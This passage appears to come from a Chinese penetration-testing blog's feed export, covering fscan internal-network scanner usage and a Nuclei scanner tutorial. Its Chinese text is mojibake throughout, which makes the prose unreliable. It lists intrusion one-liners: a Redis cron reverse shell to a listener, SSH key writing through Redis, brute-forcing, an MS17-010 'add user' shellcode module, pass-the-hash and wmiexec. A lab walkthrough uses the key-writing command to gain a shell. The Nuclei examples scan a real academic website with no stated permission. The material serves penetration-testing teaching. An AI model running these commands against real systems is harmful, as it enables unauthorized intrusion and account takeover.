variable">-sshkey</span> string      sshè¿æ¥æ—¶,æŒ‡å®šsshç§é’¥<span class="token parameter variable">-t</span> int      æ‰«æçº¿ç¨‹ <span class="token punctuation">(</span>default <span class="token number">600</span><span class="token punctuation">)</span><span class="token parameter variable">-time</span> int      ç«¯å£æ‰«æè¶…æ—¶æ—¶é—´ <span class="token punctuation">(</span>default <span class="token number">3</span><span class="token punctuation">)</span><span class="token parameter variable">-u</span> string      æŒ‡å®šUrlæ‰«æ<span class="token parameter variable">-uf</span> string      æŒ‡å®šUrlæ–‡ä»¶æ‰«æ<span class="token parameter variable">-wt</span> int      webè®¿é—®è¶…æ—¶æ—¶é—´ <span class="token punctuation">(</span>default <span class="token number">5</span><span class="token punctuation">)</span><span class="token parameter variable">-pocpath</span> string      æŒ‡å®špocè·¯å¾„<span class="token parameter variable">-usera</span> string      åœ¨åŸæœ‰ç”¨æˆ·å­—å…¸åŸºç¡€ä¸Š,æ–°å¢æ–°ç”¨æˆ·<span class="token parameter variable">-pwda</span> string      åœ¨åŸæœ‰å¯†ç å­—å…¸åŸºç¡€ä¸Š,å¢åŠ æ–°å¯†ç <span class="token parameter variable">-socks5</span>      æŒ‡å®šsocks5ä»£ç† <span class="token punctuation">(</span>as: <span class="token parameter variable">-socks5</span>  socks5://127.0.0.1:1080<span class="token punctuation">)</span><span class="token parameter variable">-sc</span>       æŒ‡å®šms17010åˆ©ç”¨æ¨¡å—shellcode,å†…ç½®æ·»åŠ ç”¨æˆ·ç­‰åŠŸèƒ½ <span class="token punctuation">(</span>as: <span class="token parameter variable">-sc</span> <span class="token function">add</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äº”ã€ç”¨æ³•ç¤ºä¾‹"><a href="#äº”ã€ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="äº”ã€ç”¨æ³•ç¤ºä¾‹"></a>äº”ã€ç”¨æ³•ç¤ºä¾‹</h1><h2 id="5-1-ç®€å•ç”¨æ³•"><a href="#5-1-ç®€å•ç”¨æ³•" class="headerlink" title="5.1 ç®€å•ç”¨æ³•"></a>5.1 ç®€å•ç”¨æ³•</h2><pre class="line-numbers language-none"><code class="language-none">fscan.exe -h 192.168.1.1/24  (é»˜è®¤ä½¿ç”¨å…¨éƒ¨æ¨¡å—)fscan.exe -h 192.168.1.1/16  (Bæ®µæ‰«æ)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5-2-å…¶ä»–ç”¨æ³•"><a href="#5-2-å…¶ä»–ç”¨æ³•" class="headerlink" title="5.2 å…¶ä»–ç”¨æ³•"></a>5.2 å…¶ä»–ç”¨æ³•</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-np</span> <span class="token parameter variable">-no</span> -nopoc<span class="token punctuation">(</span>è·³è¿‡å­˜æ´»æ£€æµ‹ ã€ä¸ä¿å­˜æ–‡ä»¶ã€è·³è¿‡web pocæ‰«æ<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-rf</span> id_rsa.pub <span class="token punctuation">(</span>redis å†™å…¬é’¥<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-rs</span> <span class="token number">192.168</span>.1.1:6666 <span class="token punctuation">(</span>redis è®¡åˆ’ä»»åŠ¡åå¼¹shell<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-c</span> <span class="token function">whoami</span> <span class="token punctuation">(</span>ssh çˆ†ç ´æˆåŠŸåï¼Œå‘½ä»¤æ‰§è¡Œ<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> <span class="token function">ssh</span> <span class="token parameter variable">-p</span> <span class="token number">2222</span> <span class="token punctuation">(</span>æŒ‡å®šæ¨¡å—sshå’Œç«¯å£<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-pwdf</span> pwd.txt <span class="token parameter variable">-userf</span> users.txt <span class="token punctuation">(</span>åŠ è½½æŒ‡å®šæ–‡ä»¶çš„ç”¨æˆ·åã€å¯†ç æ¥è¿›è¡Œçˆ†ç ´<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-o</span> /tmp/1.txt <span class="token punctuation">(</span>æŒ‡å®šæ‰«æç»“æœä¿å­˜è·¯å¾„,é»˜è®¤ä¿å­˜åœ¨å½“å‰è·¯å¾„<span class="token punctuation">)</span> fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/8  <span class="token punctuation">(</span>Aæ®µçš„192.x.x.1å’Œ192.x.x.254,æ–¹ä¾¿å¿«é€ŸæŸ¥çœ‹ç½‘æ®µä¿¡æ¯ <span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> smb <span class="token parameter variable">-pwd</span> password <span class="token punctuation">(</span>smbå¯†ç ç¢°æ’<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> ms17010 <span class="token punctuation">(</span>æŒ‡å®šæ¨¡å—<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-hf</span> ip.txt  <span class="token punctuation">(</span>ä»¥æ–‡ä»¶å¯¼å…¥<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-u</span> http://baidu.com <span class="token parameter variable">-proxy</span> <span class="token number">8080</span> <span class="token punctuation">(</span>æ‰«æå•ä¸ªurl,å¹¶è®¾ç½®httpä»£ç† http://127.0.0.1:8080<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-nobr</span> <span class="token parameter variable">-nopoc</span> <span class="token punctuation">(</span>ä¸è¿›è¡Œçˆ†ç ´,ä¸æ‰«Web poc,ä»¥å‡å°‘æµé‡<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-pa</span> <span class="token number">3389</span> <span class="token punctuation">(</span>åœ¨åŸåŸºç¡€ä¸Š,åŠ å…¥3389-<span class="token operator">&gt;</span>rdpæ‰«æ<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-socks5</span> <span class="token number">127.0</span>.0.1:1080 <span class="token punctuation">(</span>åªæ”¯æŒç®€å•tcpåŠŸèƒ½çš„ä»£ç†,éƒ¨åˆ†åŠŸèƒ½çš„åº“ä¸æ”¯æŒè®¾ç½®ä»£ç†<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> ms17010 <span class="token parameter variable">-sc</span> <span class="token function">add</span> <span class="token punctuation">(</span>å†…ç½®æ·»åŠ ç”¨æˆ·ç­‰åŠŸèƒ½,åªé€‚ç”¨äºå¤‡é€‰å·¥å…·,æ›´æ¨èå…¶ä»–ms17010çš„ä¸“é¡¹åˆ©ç”¨å·¥å…·<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> smb2 <span class="token parameter variable">-user</span> admin <span class="token parameter variable">-hash</span> xxxxx <span class="token punctuation">(</span>pth hashç¢°æ’,xxxx:ntlmhash,å¦‚32ed87bdb5fdc5e9cba88547376818d4<span class="token punctuation">)</span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> wmiexec <span class="token parameter variable">-user</span> admin <span class="token parameter variable">-pwd</span> password <span class="token parameter variable">-c</span> xxxxx <span class="token punctuation">(</span>wmiexecæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-3-å¸¸ç”¨"><a href="#5-3-å¸¸ç”¨" class="headerlink" title="5.3 å¸¸ç”¨"></a>5.3 å¸¸ç”¨</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan <span class="token parameter variable">-h</span> IP <span class="token punctuation">(</span>å…¨åŠŸèƒ½ã€ms17010ã€è¯»å–ç½‘å¡ä¿¡æ¯<span class="token punctuation">..</span>.<span class="token punctuation">)</span>fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.x.x <span class="token parameter variable">-rf</span> id_rsa.pub <span class="token punctuation">(</span>redis å†™å…¬é’¥<span class="token punctuation">)</span>fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.x.x <span class="token parameter variable">-c</span> <span class="token string">"whoami;id"</span> <span class="token punctuation">(</span>ssh å‘½ä»¤<span class="token punctuation">)</span>fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.x.x <span class="token parameter variable">-p80</span> <span class="token parameter variable">-proxy</span> http://127.0.0.1:8080 ä¸€é”®æ”¯æŒxrayçš„pocfscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.x.x <span class="token parameter variable">-p</span> <span class="token number">139</span> <span class="token punctuation">(</span>netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«,ä¸‹å›¾çš„<span class="token punctuation">[</span>+<span class="token punctuation">]</span>DCä»£è¡¨åŸŸæ§<span class="token punctuation">)</span>fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.x.x/24 <span class="token parameter variable">-m</span> netbios<span class="token punctuation">(</span>-m netbiosæ—¶,æ‰ä¼šæ˜¾ç¤ºå®Œæ•´çš„netbiosä¿¡æ¯<span class="token punctuation">)</span>fscan <span class="token parameter variable">-h</span> <span class="token number">192.0</span>.0.0/8 <span class="token parameter variable">-m</span> icmp<span class="token punctuation">(</span>æ¢æµ‹æ¯ä¸ªCæ®µçš„ç½‘å…³å’Œæ•°ä¸ªéšæœºIP,å¹¶ç»Ÿè®¡top <span class="token number">10</span> Bã€Cæ®µå­˜æ´»æ•°é‡<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="å…­ã€å®æˆ˜"><a href="#å…­ã€å®æˆ˜" class="headerlink" title="å…­ã€å®æˆ˜"></a>å…­ã€å®æˆ˜</h1><h2 id="6-1-Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜"><a href="#6-1-Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜" class="headerlink" title="6.1 Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜"></a>6.1 Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜</h2><p>å…·ä½“çš„é¶åœºæ­å»ºå’Œæ¸—é€å…¨æµç¨‹è§æœ¬ç«™ã€Šä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»ºã€‹å’Œã€Šä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§ ã€‹è¿™ä¸¤ç¯‡æ–‡ç« ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan <span class="token parameter variable">-h</span> <span class="token number">172.20</span>.10.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2009.13.21.png" style="zoom:50%;"><p>ä»æ•ˆç‡æ–¹é¢çœ‹ï¼šfscanèƒ½å¿«é€Ÿæ¢æµ‹æš´éœ²é¢ï¼Œå¹¶èƒ½è¯†åˆ«å‡ºå…³é”®çš„æ¼æ´ç‚¹ã€‚</p><p>ä»å‡†ç¡®ç‡æ–¹é¢çœ‹ï¼šfscanè¯†åˆ«åˆ°çš„redisæœªæˆæƒè®¿é—®æ¼æ´å’ŒCVE-2021-312åˆ†åˆ«èƒ½è¾…åŠ©æ‹¿ä¸‹ä¸¤å°ä¸»æœºã€‚å…·ä½“è§æœ¬ç«™ã€Šä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§ ã€‹ä¸€æ–‡ã€‚</p><ul><li>fscanç›´æ¥å†™å…¬é’¥</li></ul><p>å†™å…¥ä¹‹å‰ï¼šéœ€è¦å¯†ç æ‰èƒ½ç™»å½•ã€‚</p><p><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2009.23.33.png" alt="æˆªå±2025-01-22 09.23.33"></p><p>å†™å…¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan <span class="token parameter variable">-h</span> <span class="token number">172.20</span>.10.5 <span class="token parameter variable">-rf</span> ~/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2009.25.31.png" style="zoom:50%;"><p>sshå…¬é’¥æˆåŠŸå†™å…¥ã€‚</p><p>å†æ¬¡å°è¯•ç™»å½•ï¼š</p><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2009.26.45.png" style="zoom:50%;"><p>æˆåŠŸç™»å½•å¹¶è·å–shellã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> å†…ç½‘æ‰«æ </tag>
            
            <tag> å†…ç½‘æ”»é˜² </tag>
            
            <tag> fscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nucleiæ¼æ´æ‰«æ</title>
      <link href="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/"/>
      <url>/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Nucleiç®€ä»‹"><a href="#ä¸€ã€Nucleiç®€ä»‹" class="headerlink" title="ä¸€ã€Nucleiç®€ä»‹"></a>ä¸€ã€Nucleiç®€ä»‹</h1><p>Nucleiæ˜¯ä¸€æ¬¾åŸºäºYAMLè¯­æ³•æ¨¡æ¿å¼€å‘çš„å¼€æºå¿«é€Ÿæ¼æ´æ‰«æå·¥å…·ï¼Œç”±ProjectDiscoveryå›¢é˜Ÿå¼€å‘ã€‚å®ƒä½¿ç”¨Goè¯­è¨€ç¼–å†™ï¼Œå…·æœ‰é«˜æ•ˆã€å¯æ‰©å±•å’Œæ˜“ç”¨çš„ç‰¹ç‚¹ã€‚Nucleié€šè¿‡æ¨¡æ¿åŒ–çš„æ–¹å¼å®šä¹‰æ¼æ´æ£€æµ‹é€»è¾‘ï¼Œæ”¯æŒTCPã€DNSã€HTTPã€FILEç­‰å¤šç§åè®®çš„æ‰«æã€‚</p><p>Nucleiå¹¿æ³›åº”ç”¨äºæ¸—é€æµ‹è¯•ã€æ¼æ´éªŒè¯å’Œè‡ªåŠ¨åŒ–å®‰å…¨è¯„ä¼°ã€‚å®ƒå¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜å¿«é€Ÿå‘ç°å’ŒéªŒè¯æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p><h2 id="1-1-ç‰¹ç‚¹"><a href="#1-1-ç‰¹ç‚¹" class="headerlink" title="1.1 ç‰¹ç‚¹"></a>1.1 ç‰¹ç‚¹</h2><ol><li><strong>æ¨¡æ¿åŒ–æ‰«æ</strong>ï¼šNucleiä½¿ç”¨YAMLæ¨¡æ¿æ¥æè¿°æ¼æ´çš„ç‰¹å¾å’Œæ£€æµ‹é€»è¾‘ï¼Œè¿™äº›æ¨¡æ¿å¯ä»¥æ˜¯å®˜æ–¹æä¾›çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ã€‚</li><li><strong>é«˜æ€§èƒ½</strong>ï¼šæ”¯æŒå¹¶å‘æ‰«æï¼Œèƒ½å¤Ÿå¿«é€Ÿæ‰«æå¤§é‡ç›®æ ‡ã€‚</li><li><strong>é›¶è¯¯æŠ¥</strong>ï¼šé€šè¿‡ç²¾ç¡®çš„æ¨¡æ¿è®¾è®¡ï¼ŒNucleièƒ½å¤Ÿæœ‰æ•ˆå‡å°‘è¯¯æŠ¥ã€‚</li><li><strong>å¯æ‰©å±•æ€§</strong>ï¼šç”¨æˆ·å¯ä»¥ç¼–å†™è‡ªå®šä¹‰æ¨¡æ¿ï¼Œä»¥é€‚åº”ç‰¹å®šçš„æ¼æ´æ£€æµ‹éœ€æ±‚ã€‚</li><li><strong>ç¤¾åŒºæ”¯æŒ</strong>ï¼šæ‹¥æœ‰æ´»è·ƒçš„ç¤¾åŒºå’Œä¸°å¯Œçš„æ¨¡æ¿åº“ï¼Œè¦†ç›–å¤šç§å·²çŸ¥æ¼æ´ã€‚</li></ol><h1 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h1><p>Nucleiå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®‰è£…ï¼š</p><ul><li>ä½¿ç”¨Goè¯­è¨€å®‰è£…ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go <span class="token function">install</span> <span class="token parameter variable">-v</span> github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ä½¿ç”¨Homebrewå®‰è£…ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> nuclei<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2010.43.58.png" style="zoom:50%;"><ul><li>ä½¿ç”¨Dockerå®‰è£…ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull projectdiscovery/nuclei:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç›´æ¥ä¸‹è½½äºŒè¿›åˆ¶ç‰ˆæœ¬ï¼š</li></ul><p><a href="https://github.com/projectdiscovery/nuclei/releases">https://github.com/projectdiscovery/nuclei/releases</a></p><p>éªŒè¯å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-h</span>æˆ– nuclei<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2010.45.06.png" style="zoom:50%;"><p>æ›´æ–°æ¨¡ç‰ˆåº“ï¼š</p><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2010.45.37.png" style="zoom:50%;"><p>å¦‚æœå‡ºç°ä¸Šé¢çš„æƒ…å†µå¯èƒ½æ˜¯ç½‘ç»œåŸå› ï¼Œé‡æ–°è¿è¡Œ<code>nuclei</code>å°è¯•ã€‚</p><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2010.46.22.png" style="zoom:50%;"><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2010.48.34.png" style="zoom:50%;"><p>æ¨¡ç‰ˆåº“æ›´æ–°æˆåŠŸã€‚</p><h1 id="ä¸‰ã€ä½¿ç”¨æ–¹æ³•"><a href="#ä¸‰ã€ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä¸‰ã€ä½¿ç”¨æ–¹æ³•"></a>ä¸‰ã€ä½¿ç”¨æ–¹æ³•</h1><h2 id="3-1-åŸºæœ¬æ ¼å¼"><a href="#3-1-åŸºæœ¬æ ¼å¼" class="headerlink" title="3.1 åŸºæœ¬æ ¼å¼"></a>3.1 åŸºæœ¬æ ¼å¼</h2><p>è¿è¡ŒNucleiçš„åŸºæœ¬å‘½ä»¤æ ¼å¼ä¸ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>ç›®æ ‡URL<span class="token operator">&gt;</span> <span class="token parameter variable">-t</span> <span class="token operator">&lt;</span>æ¨¡æ¿è·¯å¾„<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨æˆ·è¿˜å¯ä»¥é€šè¿‡æŒ‡å®šæ¨¡æ¿ç›®å½•ã€ç›®æ ‡åˆ—è¡¨æ–‡ä»¶ã€å¹¶å‘æ•°ç­‰å‚æ•°ï¼Œçµæ´»æ§åˆ¶æ‰«æè¿‡ç¨‹ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-h</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹å¸®åŠ©æ‰‹å†Œã€‚</p><h2 id="3-2-å¸¸ç”¨å‚æ•°"><a href="#3-2-å¸¸ç”¨å‚æ•°" class="headerlink" title="3.2 å¸¸ç”¨å‚æ•°"></a>3.2 å¸¸ç”¨å‚æ•°</h2><h3 id="3-2-1-ç›®æ ‡-TARGET"><a href="#3-2-1-ç›®æ ‡-TARGET" class="headerlink" title="3.2.1 ç›®æ ‡ TARGET"></a>3.2.1 ç›®æ ‡ TARGET</h3><ul><li>-u, -target string[]              ç›®æ ‡URL/ä¸»æœºï¼Œå¯ä»¥æ˜¯æ•°ç»„ã€‚</li><li>-l, -list string                        ä¸€ä¸ªåŒ…å«ç›®æ ‡URL/ä¸»æœºçš„åˆ—è¡¨æ–‡ä»¶ã€‚</li><li>-sa, -scan-all-ips                 æ‰«ææ‰€æœ‰DNSè®°å½•å…³è”çš„IPã€‚</li><li>-iv, -ip-version string[]      æŒ‡å®šè¦æ‰«æçš„IPç‰ˆæœ¬ï¼Œé»˜è®¤ä¸ºIPv4ã€‚</li></ul><h3 id="3-2-2-æ¨¡ç‰ˆ-TEMPLATES"><a href="#3-2-2-æ¨¡ç‰ˆ-TEMPLATES" class="headerlink" title="3.2.2 æ¨¡ç‰ˆ TEMPLATES"></a>3.2.2 æ¨¡ç‰ˆ TEMPLATES</h3><ul><li>-tl                                         åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ¨¡ç‰ˆã€‚</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-tl</span> <span class="token operator">&gt;</span> nuclei_tmp.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2010.59.48.png" style="zoom:50%;"><p>ç›®å‰æœ‰7607ä¸ªå¯ç”¨æ¨¡ç‰ˆï¼Œé‡è¿˜æ˜¯å¾ˆå¤§çš„ã€‚</p><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2011.02.59.png" style="zoom:50%;"><ul><li><p>-nt  ä»…è¿è¡Œæœ€æ–°å‘å¸ƒçš„nucleiæ¨¡ç‰ˆ</p></li><li><p>-t æŒ‡å®šè¦è¿è¡Œçš„æ¨¡ç‰ˆæˆ–æ¨¡ç‰ˆç›®å½•ï¼ˆå¤šæ¨¡ç‰ˆä»¥ï¼Œåˆ†éš”ï¼‰</p></li></ul><h3 id="3-2-3-è°ƒè¯•-DEBUG"><a href="#3-2-3-è°ƒè¯•-DEBUG" class="headerlink" title="3.2.3 è°ƒè¯• DEBUG"></a>3.2.3 è°ƒè¯• DEBUG</h3><ul><li>-version                   æ˜¾ç¤ºnucleiç‰ˆæœ¬</li></ul><p>å…¶ä»–å‚æ•°åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­æ…¢æ…¢ç§¯ç´¯å³å¯ã€‚</p><h2 id="3-3-å¦‚ä½•ä½¿ç”¨"><a href="#3-3-å¦‚ä½•ä½¿ç”¨" class="headerlink" title="3.3 å¦‚ä½•ä½¿ç”¨"></a>3.3 å¦‚ä½•ä½¿ç”¨</h2><h3 id="3-3-1-é»˜è®¤ä½¿ç”¨å…¨æ¨¡ç‰ˆæ‰«æ"><a href="#3-3-1-é»˜è®¤ä½¿ç”¨å…¨æ¨¡ç‰ˆæ‰«æ" class="headerlink" title="3.3.1 é»˜è®¤ä½¿ç”¨å…¨æ¨¡ç‰ˆæ‰«æ"></a>3.3.1 é»˜è®¤ä½¿ç”¨å…¨æ¨¡ç‰ˆæ‰«æ</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰æ¨¡ç‰ˆéƒ½ä»é»˜è®¤æ¨¡ç‰ˆå®‰è£…è·¯å¾„æ‰§è¡Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-u</span> https://archeodata.sinica.edu.tw/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-2-æŒ‡å®šæ¨¡ç‰ˆç›®å½•"><a href="#3-3-2-æŒ‡å®šæ¨¡ç‰ˆç›®å½•" class="headerlink" title="3.3.2 æŒ‡å®šæ¨¡ç‰ˆç›®å½•"></a>3.3.2 æŒ‡å®šæ¨¡ç‰ˆç›®å½•</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-u</span> https://example.com <span class="token parameter variable">-t</span> cves/ <span class="token parameter variable">-t</span> exposures/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129"><a href="#å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129" class="headerlink" title="å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129"></a>å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-u</span> http://172.20.10.5:81/ <span class="token parameter variable">-t</span> cves/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2011.32.37.png" style="zoom:50%;"><p>æˆåŠŸæ£€æµ‹åˆ° CVE-2021-3129æ¼æ´ã€‚</p><p>å…·ä½“çš„åˆ©ç”¨æ–¹æ³•è§æœ¬ç«™ã€ŠLaravel RCE CVE-2021-3129ã€‹ä¸€æ–‡ã€‚</p></blockquote><h3 id="3-3-3-æŒ‡å®šå•ä¸ªæ¨¡ç‰ˆè¿›è¡Œæµ‹è¯•"><a href="#3-3-3-æŒ‡å®šå•ä¸ªæ¨¡ç‰ˆè¿›è¡Œæµ‹è¯•" class="headerlink" title="3.3.3 æŒ‡å®šå•ä¸ªæ¨¡ç‰ˆè¿›è¡Œæµ‹è¯•"></a>3.3.3 æŒ‡å®šå•ä¸ªæ¨¡ç‰ˆè¿›è¡Œæµ‹è¯•</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-u</span> https://archeodata.sinica.edu.tw/ <span class="token parameter variable">-t</span> 